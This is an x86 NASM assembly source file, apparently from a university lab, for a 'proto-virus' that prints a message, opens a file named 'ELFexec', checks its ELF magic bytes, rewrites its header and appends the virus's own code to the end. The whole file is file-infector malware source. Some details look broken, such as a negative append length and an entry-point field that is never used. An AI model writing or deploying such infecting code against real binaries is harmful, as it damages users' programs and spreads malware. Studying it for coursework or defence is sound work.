%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	call get_my_loc
	sub ecx, next_i - OutStr

	write 1, ecx, 31

	call get_my_loc
    sub ecx, next_i - FileName
	mov ebx, ecx
    
    open ebx, RDWR, 0777
	mov [ebp-4], eax

    cmp eax, 0
    jl failed

	mov ecx, ebp
	sub ecx, 12

	mov ebx, [ebp-4]

	
	read ebx, ecx, 4 
    
    cmp eax, 0
    jle failed   

    mov ecx, ebp
	sub ecx, 12

    cmp byte [ecx], 0x7f
    jne failed

    inc ecx
    cmp byte [ecx], 'E'
    jne failed

    inc ecx
    cmp byte [ecx], 'L'
    jne failed

    inc ecx
    cmp byte [ecx], 'F'
    jne failed  

	mov ecx, ebp
	sub ecx, 36

	mov ebx, [ebp-4]

	read ebx, ecx, 28 

	lseek dword [ebp-4], 0, SEEK_END
	mov [ebp-8], eax

	lseek dword [ebp-4], 0, SEEK_SET

	mov eax, [ebp-8]
	mov dword [ebp-12], eax

	mov ecx, ebp
	sub ecx, 36

	mov ebx, [ebp-4]

	write ebx, ecx, 28

	lseek dword [ebp-4], 0, 2
	mov [ebp-8], eax

	call get_my_loc
    sub ecx, next_i - _start

	mov ebx, [ebp-4]

	write ebx, ecx, _start - virus_end

	cmp eax, 0
    jle failed

	close dword [ebp-4]

	jmp VirusExit

	failed:
		call get_my_loc
		sub ecx, next_i - Failstr

		write 1, ecx, 12
		exit -1


VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

					 
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit

get_my_loc:
    call next_i
next_i:
    pop ecx
    ret	




virus_end:


